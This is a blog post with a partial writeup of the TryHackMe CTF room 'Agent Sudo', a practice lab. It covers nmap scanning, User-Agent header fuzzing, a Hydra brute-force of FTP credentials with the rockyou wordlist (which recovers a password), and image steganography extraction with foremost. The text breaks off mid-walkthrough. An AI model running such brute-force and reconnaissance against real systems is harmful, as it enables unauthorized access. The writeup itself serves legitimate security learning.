---
layout: post
title:  "THM writeup - Agent Sudo"
date:   2021-07-14 15:09:43 +0100
categories: post update
---

Writeup on the TryHackMe room "Agent Sudo".

[Link to room.](https://tryhackme.com/room/agentsudoctf)

Running an -sS nmap on the server IP shows three ports open; 21, 22 and 80.
We get more information about the services on these ports with the -sC -sV scan, specifying only these discovered ports.

```
udo nmap -sC -sV -oN nmap 10.10.86.99
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-14 11:50 IST
Nmap scan report for 10.10.86.99
Host is up (0.036s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds
```

Checking out the site on port 80 we have the following:

![](../../../../../assets/2021-07-14-12-00-22.png)

The mention of ```user-agent``` is probably a hint.
```User-Agent``` is one of the headers used for sending HTTP requests.
It will typically contain the browser name/type that is sending the request.

After some searching for a Firefox plugin to allow us to change this, we start fuzzing the user-agent.
There are no results with setting ```codename``` or ```Agent R``` as the user-agent, however we do get a different result with just ```R``` as the User-Agent.

Using the hint of changing user-agent to 'C' we get the following page, which provides a possible username, as well as hint for a weak password being used.

```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```
Using Hydra we can attempt a brute force using this username against the FTP port.

```
# hydra -l chris -P ~/rockyou.txt -vV 10.10.86.99 ftp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

<---snip-->
[21][ftp] host: 10.10.86.99   login: chris   password: crystal
[STATUS] attack finished for 10.10.86.99 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

We can then log into the FTP server using the username and password, and we find three files, a TXT file, a JPEG and a PNG.

Looking at the TXT file we have a hint to some data being hidden in one of the image files, possibly the SSH password for the account 'chris'.

```
$ cat To_agentJ.txt 
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

Sounds like a bit of steganography, possibly even an SSH password hidden in one of the images, so using [foremost](https://en.wikipedia.org/wiki/Foremost_(software)) the following data can be retrieved from cutie.png.

```
 foremost ./cutie.png 
Processing: ./cutie.png
|foundat=To_agentR.txt�
*|

$ ls output/
audit.txt  png  zip

$ ls output/zip/
00000067.zip

$
$